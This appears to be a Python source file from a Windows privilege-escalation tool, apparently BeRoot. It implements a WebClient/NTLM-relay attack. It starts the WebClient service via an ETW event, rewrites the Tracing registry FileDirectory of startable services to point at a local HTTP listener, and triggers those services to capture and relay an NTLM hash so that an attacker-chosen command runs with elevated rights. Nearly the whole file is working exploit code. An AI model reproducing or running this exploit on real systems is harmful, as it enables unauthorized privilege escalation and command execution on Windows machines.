from beroot.modules.objects.winstructures import *
from httpserver import runHTTPServer
from constant import constants
from random import randint
from attack import doAttack
from ctypes.wintypes import *
from ctypes import *
import _winreg
import time

UCHAR 		= c_ubyte

# x86 bits system
if sizeof(c_voidp) == 4:
	ULONGLONG 	= c_longlong
# x64 bits system
else:
	ULONGLONG 	= c_ulonglong

class GUID(Structure):
	_fields_ = [
		("Data1", DWORD),
		("Data2", WORD),
		("Data3", WORD),
		("Data4", BYTE * 8)
	] 

class EVENT_DESCRIPTOR(Structure):
	_fields_ = [
		("Id", 		USHORT),
		("Version", UCHAR),
		("Channel", UCHAR),
		("Level", 	UCHAR),
		("Opcode", 	UCHAR), 
		("Task", 	USHORT), 
		("Keyword", ULONGLONG)
	]

# inspired from https://github.com/secruul/SysExec
# and https://www.exploit-db.com/exploits/36424/
class WebClient():

	def __init__(self):
		self.scm = OpenSCManager(None, None, SC_MANAGER_CONNECT)

		# Define functions
		self.EventRegister 		= windll.advapi32.EventRegister
		self.EventUnregister 	= windll.advapi32.EventUnregister
		self.EventWrite 		= windll.advapi32.EventWrite
		
		self.timeout = 20

	# check if the system has been hardenned enough to avoid this kind of privilege escalation
	def isSMBHardened(self):
		hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters', 0, KEY_READ)
		
		smb_signature = 0
		server_name_hardening = 0
		try:
			smb_signature = int(_winreg.QueryValueEx(hkey, 'RequireSecuritySignature')[0])
			server_name_hardening = int(_winreg.QueryValueEx(hkey, 'SmbServerNameHardeningLevel')[0])
		except:
			pass

		if smb_signature == 0 and server_name_hardening == 0:
			return False
		else:
			return True

	# start the WebClient service from a limited user
	def startWebclient(self):
		success = False
		hReg = HANDLE()
		guid = GUID()

		# guid: 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7
		guid.Data1 = c_ulong(0x22B6D684)
		guid.Data2 = c_ushort(0xFA63)
		guid.Data3 = c_ushort(0x4578)

		guid.Data4[0] = c_byte(0x87)
		guid.Data4[1] = c_byte(0xC9)
		guid.Data4[2] = c_byte(0xEF)
		guid.Data4[3] = c_byte(0xFC)
		guid.Data4[4] = c_byte(0xBE)
		guid.Data4[5] = c_byte(0x66)
		guid.Data4[6] = c_byte(0x43)
		guid.Data4[7] = c_byte(0xC7)


		if self.EventRegister(byref(guid), None, None, byref(hReg)) == 0:	
			event_desc = EVENT_DESCRIPTOR()
			event_desc.Id 			= 1
			event_desc.Version 		= 0
			event_desc.Channel 		= 0
			event_desc.Level 		= 4
			event_desc.Task 		= 0
			event_desc.Opcode 		= 0
			event_desc.Keyword 		= 0

			if self.EventWrite(hReg, byref(event_desc), 0, None) == 0:
				success = True
			self.EventUnregister(hReg)

		return success

	def find_services_trigger(self, service):
		accessWrite = KEY_WRITE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE
		hkey = OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing', 0, accessWrite)
		num = _winreg.QueryInfoKey(hkey)[0]

		triggers = []
		for x in range(0, num):
			svc = _winreg.EnumKey(hkey, x)
			for s in service:
				if s.name.lower() == svc.lower() and s.permissions['start']:
					isServiceRunning = self.isServiceRunning(svc)
					if not isServiceRunning or (isServiceRunning and s.permissions['stop']):
						triggers.append(s)
						print '[+] Service %s found' % s.name
					else:
						print '[-] Service %s already running and could not be stopped' % s.name
		_winreg.CloseKey(hkey)
		return triggers

	def modify_registry(self, service_name, fileDirectory='%windir%\\tracing', enableFileTracing=0):
		skey = OpenKey(HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Tracing\\%s' % service_name, 0, KEY_WRITE)
		_winreg.SetValueEx(skey, 'FileDirectory', 0, REG_EXPAND_SZ, fileDirectory)
		_winreg.SetValueEx(skey, 'EnableFileTracing', 0, REG_DWORD, enableFileTracing)
		_winreg.CloseKey(skey)

	# check if a service is stopped or if it is running
	def isServiceRunning(self, service_name):
		isRunning = False
		sc_query_config = OpenService(self.scm, service_name, SERVICE_QUERY_STATUS)
		ss = SERVICE_STATUS()
		if QueryServiceStatus(sc_query_config, byref(ss)):
			status = int(ss.dwCurrentState.real)
		else:
			status = False
		
		if status == SERVICE_RUNNING:
			isRunning = True

		# wait that the service start correctly
		if status == SERVICE_START_PENDING:	
			time.sleep(2)
			isRunning = True

		CloseServiceHandle(sc_query_config)
		return isRunning

	# Open a service given either it's long or short name.
	def SmartOpenService(self, hscm, name, access):
		try:
			return OpenService(hscm, name, access)
		except:
			return False
		
		lpcchBuffer 	= LPDWORD()
		lpDisplayName 	= PCTSTR()
		lpServiceName 	= PCTSTR()
		result = GetServiceKeyName(hscm, byref(lpDisplayName), byref(lpServiceName), lpcchBuffer)
		if result:
			name = lpServiceName.value
			return OpenService(hscm, name, access)
		else:
			return False


	def StartService(self, serviceName, args = 0, machine = None):
		hscm = OpenSCManager(machine, None, SC_MANAGER_CONNECT)
		try:
			hs = self.SmartOpenService(hscm, serviceName, SERVICE_START)
			if hs:
				try:
					StartService(hs, args, None)
				finally:
					CloseServiceHandle(hs)
		finally:
			CloseServiceHandle(hscm)

	def StopService(self, serviceName, machine = None):
		hscm = OpenSCManager(machine, None, SC_MANAGER_CONNECT)
		try:
			hs = self.SmartOpenService(hscm, serviceName, SERVICE_STOP)
			if hs:
				try:
					ss = SERVICE_STATUS()
					ControlService(hs, SERVICE_CONTROL_STOP, byref(ss))
				finally:
					CloseServiceHandle(hs)
		finally:
			CloseServiceHandle(hscm)

	def run(self, service, command):
		print '[!] Checking WebClient vulnerability'

		if self.isSMBHardened():
			print '[-] Not vulnerable, SMB is hardened'
			return False

		# check if webclient is already running
		if not self.isServiceRunning('WebClient'):
			# if not try to start it
			if self.startWebclient():
				
				# check if service has been correctly started
				if not self.isServiceRunning('WebClient'):
					print '[-] WebClient could not be started'
					return False

		print '[!] Find services used to trigger an NTLM hash'
		triggers = self.find_services_trigger(service)
		if not triggers:
			print '[-] No service found'
			return False
		
		else:
			for trigger in triggers:
				error = False
				port = randint(8000, 9999)

				# launch http server
				print '[!] Setting up HTTP Server 127.0.0.1:%s' % port
				print '[!] Command to execute: %s' % command
				runHTTPServer(port, service=trigger.name, command=command)

				# check if the trigger service is already running
				if self.isServiceRunning(trigger.name) and trigger.permissions['stop']:
					# we should not have enought privilege to stop it but lets try to check a misconfiguration on this service
					print '[!] Service %s is running, trying to stop it' % trigger.name
					self.StopService(trigger.name)
					
					if self.isServiceRunning(trigger.name):
						# service could not be used as trigger
						print '[-] Enable to stop the sevice %s' % trigger.name
						continue
					print '[+] Service %s has been stopped' % trigger.name
				
				# redirect FileDirectory regedit key to our listening server
				self.modify_registry(trigger.name, fileDirectory='\\\\127.0.0.1@%s\\tracing' % port, enableFileTracing=1)

				# launch service trigger
				self.StartService(trigger.name)
				if self.isServiceRunning(trigger.name):
					print '[+] Service %s has been correctly started, waiting to get an hash' % trigger.name
				else:
					print '[-] Failed to start the service %s' % trigger.name
					continue

				start = time.time()
				while not constants.outputCmd:
					elapsed = time.time() - start
					if elapsed > self.timeout and not constants.isRunning:
						print '[-] Timeout reached. Exit'
						error = True
						break

				# clean up / restore value as origin
				self.modify_registry(trigger.name)
				
				# success
				if not error:
					break

		ok = False
		if constants.authentication_succeed == True:
			try:
				print '[!] Stopping the service %s' % trigger.name
				executeCmd = doAttack(constants.smb_client, 'sc stop %s' % trigger.name)
				executeCmd.run()
				if not self.isServiceRunning(trigger.name):
					print '[+] Service %s has been correctly stopped' % trigger.name
			except:
				pass

			print '[+] Authentication succeed: \n\n%s' % str(constants.outputCmd)
			ok = True

		elif constants.authentication_succeed == False:
			print '[-] Authentication failed; seems not vulnerable'

		elif constants.authentication_succeed == None:
			print '[?] The authentication process has not reached the end, try to check the standard output' 

		return ok